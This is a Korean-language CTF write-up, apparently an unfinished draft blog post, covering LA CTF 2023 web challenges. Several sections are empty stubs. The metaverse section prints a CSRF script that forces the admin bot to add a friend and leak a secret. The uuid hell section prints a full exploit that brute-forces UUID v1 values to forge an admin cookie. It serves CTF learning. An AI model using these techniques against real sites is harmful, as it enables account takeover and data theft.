---
title: LA CTF 2023-2025 Writeup
published: 2025-02-15
updated: 2025-02-15
description: A writeup for LA CTF 2023-2025 (Web)
image: ./logo.gif
tags:
  - Writeup
  - CTF
  - Web
category: CTF
draft: true
---

한번 풀어보고 싶었던 **LA CTF**의 **Web** 문제들을 풀어보았다. 업솔빙한 문제도 포함되어 있다.
::github{repo="uclaacm/lactf-archive"}
문제들은 여기서 확인할 수 있다.

`admin bot`은 로컬 환경에서 사용할 수 있도록 `domain`을 수정하였다.

# 2023

## web/college-tour (756 solves, 100 points)

### Description

Welcome to UCLA! To explore the #1 public college, we have prepared a scavenger hunt for you to walk all around the beautiful campus.

### Solution

1 - 2,4: `index.html` 파일을 보면 알 수 있다.

3: `index.css` 파일을 보면 알 수 있다.

5 - 6: `script.js` 파일을 보면 알 수 있다.

`lactf{j03_4nd_j0S3phIn3_bRU1n_sAY_hi}`

## web/metaverse (346 solves, 236 points)

### Description

Metaenter the metaverse and metapost about metathings. All you have to metado is metaregister for a metaaccount and you're good to metago.

You can metause our fancy new `metaadmin metabot` to get the admin to metaview your metapost!

### Solution

`index.js` 파일을 제공해준다.

파일을 살펴보면 `flag`가 `admin` 계정의 `displayName`에 저장되어 있다.

```javascript
accounts.set('admin', {
  password: adminpw,
  displayName: flag,
  posts: [],
  friends: [],
});
```

bot이 제공되었기 때문에 `xss`를 이용하여 `displayName`을 릭할 수 있지 않을까 싶었다.

그런데, 아래와 같이 `httpOnly`가 `true`이기 때문에 쿠키를 릭하는 방법 대신에 사이트 내에 있는 로직을 참조하는게 좋을 듯 했다.

```javascript
app.post('/login', (req, res) => {
  if (
    typeof req.body.username !== 'string' ||
    typeof req.body.password !== 'string'
  ) {
    res.redirect(
      '/login#' + encodeURIComponent('Please metafill out all the metafields.'),
    );
    return;
  }
  const username = req.body.username.trim();
  const password = req.body.password.trim();
  if (accounts.has(username) && accounts.get(username).password === password) {
    res.cookie('login', `${username}:${password}`, { httpOnly: true });
    res.redirect('/');
  } else {
    res.redirect(
      '/login#' + encodeURIComponent('Wrong metausername/metapassword.'),
    );
  }
});
```

마침 `friends`를 추가하는 기능이 있었다.
그런데, 초대한 사람한테는 안보이고, 초대받은 사람한테만 `displayName`을 보여준다.
따라서, `admin bot`을 통해서 친구 추가를 받고, 친구 리스트를 통해서 `displayName`을 확인할 수 있다.

```javascript
app.post('/friend', needsAuth, (req, res) => {
  res.type('text/plain');
  const username = req.body.username.trim();
  if (!accounts.has(username)) {
    res.status(400).send("Metauser doesn't metaexist");
  } else {
    const user = accounts.get(username);
    if (user.friends.includes(res.locals.user)) {
      res.status(400).send('Already metafriended');
    } else {
      user.friends.push(res.locals.user);
      res.status(200).send('ok');
    }
  }
});

app.get('/friends', needsAuth, (req, res) => {
  res.type('application/json');
  res.send(
    JSON.stringify(
      accounts
        .get(res.locals.user)
        .friends.filter((username) => accounts.has(username))
        .map((username) => ({
          username,
          displayName: accounts.get(username).displayName,
        })),
    ),
  );
});
```

일단, 여기까지 와서 보니 `xss`라기보단 `csrf`로 풀리는 문제였다.

`bmcyver`라는 계정을 만들고 아래 코드를 포스트하고, `admin bot`이 해당 페이지를 방문하게 하면 된다.

```html
<script>
  fetch('http://metaverse:8080/friend', {
    method: 'POST',
    body: 'username=bmcyver',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
    },
  });
</script>
```

![metaverse-1](metaverse-1.png)

`lactf{please_metaget_me_out_of_here}`

~~익스 코드 짜는 것보다 docker 네트워크 이슈 때문에 고생했다;;~~

## web/uuid hell (165 solves, 391 points)

### Description

UUIDs are the best! I love them (if you couldn't tell)!

### Solution

먼제 이 문제를 해결하기 위해서는 **uuid v1**에 대한 이해가 필요하다.

**uuid v1**은 `MAC 주소`와 `시간`을 기반으로 생성되는 **uuid**이다.

즉, **uuid**의 **randomness**는 상당히 떨어진다.

아래의 이미지를 참조하면 한번에 이해가 될 것이다.

![hell-uuid-1](hell-uuid-1.png)

이제 코드를 한번 분석해보자.

```javascript
function randomUUID() {
  return uuid.v1({
    node: [0x67, 0x69, 0x6e, 0x6b, 0x6f, 0x69],
    clockseq: 0b10101001100100,
  });
}

function getUsers() {
  let output = '<strong>Admin users:</strong>\n';
  adminuuids.forEach((adminuuid) => {
    const hash = crypto // [!code highlight:4]
      .createHash('md5')
      .update('admin' + adminuuid)
      .digest('hex');
    output += `<tr><td>${hash}</td></tr>\n`;
  });
  output += '<br><br><strong>Regular users:</strong>\n';
  useruuids.forEach((useruuid) => {
    const hash = crypto.createHash('md5').update(useruuid).digest('hex');
    output += `<tr><td>${hash}</td></tr>\n`;
  });
  return output;
}

app.get('/', (req, res) => {
  let id = req.cookies['id'];
  if (id === undefined || !isUuid(id)) {
    id = randomUUID();
    res.cookie('id', id);
    useruuids.push(id);
    if (useruuids.length > 50) {
      useruuids.shift();
    }
  } else if (isAdmin(id)) {
    // [!code highlight:4]
    res.send(process.env.FLAG);
    return;
  }

  res.send('You are logged in as ' + id + '<br><br>' + getUsers());
});

app.post('/createadmin', (req, res) => {
  const adminid = randomUUID();
  adminuuids.push(adminid);
  if (adminuuids.length > 50) {
    adminuuids.shift();
  }
  res.send('Admin account created.');
});
```

유저의 경우에는 그냥 해시를 하고 있지만, 어드민의 경우에는 `admin`을 붙여서 해시를 하고 있다.
그리고 `uuid`는 최대 50개까지 저장할 수 있어 보인다.

```typescript
import { create } from '@web';
import { logger, md5 } from '@utils';
const r = create({
  baseURL: 'http://localhost:8080',
});

logger.info('Starting to create admins...');

for (let i = 0; i < 25; i++) {
  await r.post('/createadmin');
}
let currentUUID = await r
  .get<string>('/')
  .then((res) =>
    res.data.split('You are logged in as ')[1].split('<br>')[0].trim(),
  );

for (let i = 0; i < 25; i++) {
  await r.post('/createadmin');
}

const hashedUUIDs = await r
  .get<string>('/')
  .then((res) =>
    res.data
      .split('<strong>Admin users:</strong>')[1]
      .split('<br><br><strong>Regular users:</strong>')[0]
      .replaceAll('<tr><td>', '')
      .replaceAll('</td></tr>', '')
      .split('\n'),
  );

const header = currentUUID.substring(0, 2);
logger.info(`Current UUID: ${currentUUID}, Header: ${header}`);
currentUUID = currentUUID.slice(8);

const hexChars = '0123456789abcdef';
async function checkAdmin() {
  for (let i = 0; i < hexChars.length; i++) {
    logger.info(`Trying ${i + 1}/${hexChars.length}`);
    for (let j = 0; j < hexChars.length; j++) {
      for (let k = 0; k < hexChars.length; k++) {
        for (let l = 0; l < hexChars.length; l++) {
          for (let m = 0; m < hexChars.length; m++) {
            for (let n = 0; n < hexChars.length; n++) {
              const hex = `${hexChars[i]}${hexChars[j]}${hexChars[k]}${hexChars[l]}${hexChars[m]}${hexChars[n]}`;
              const hash = md5(`admin${header}${hex}${currentUUID}`);
              if (hashedUUIDs.includes(hash)) {
                r.setCookie('id', `${header}${hex}${currentUUID}`);
                logger.info(`Found the admin: ${hash}`);
                return;
              }
            }
          }
        }
      }
    }
  }
}

await checkAdmin();

await r.get('/').then((res) => logger.flag(res.data));
```

![hell-uuid-2](hell-uuid-2.png)

`lactf{uu1d_v3rs10n_1ch1_1s_n07_r4dn0m}`

## web/85_reasons_why (78 solves, 457 points)

### Description

If you wanna catch up on ALL the campus news, check out my new blog. It even has a reverse image search feature!

### Solution

//TODO

## web/california-state-police (40 solves, 480 points)

### Description

Stop! You're under arrest for making suggestive 3 letter acronyms!

`Admin Bot` (note: the `adminpw` cookie is HttpOnly and SameSite=Lax)

### Solution

## web/queue up! (34 solves, 483 points)

### Description

I've put the flag on a web server, but due to high load, I've had to put a virtual queue in front of it. Just wait your turn patiently, ok? You'll get the flag _eventually_.

Disclaimer: Average wait time is 61 days.

### Solution

## web/hptla (40 solves, 487 points)

### Description

I made a new hyper-productive todo list app that limits you to 12 characters per item so you can stop wasting time writing overly intricate todo lists!

`Admin Bot` (note: the `adminpw` cookie is HttpOnly and SameSite=Lax)

### Solution

## web/zero-trust (24 solves, 488 points)

### Description

I was researching zero trust proofs in cryptography and now I have zero trust in JWT libraries so I rolled my own! That's what zero trust means, right?

Note: the flag is in `/flag.txt`

### Solution

# 2024

# 2025
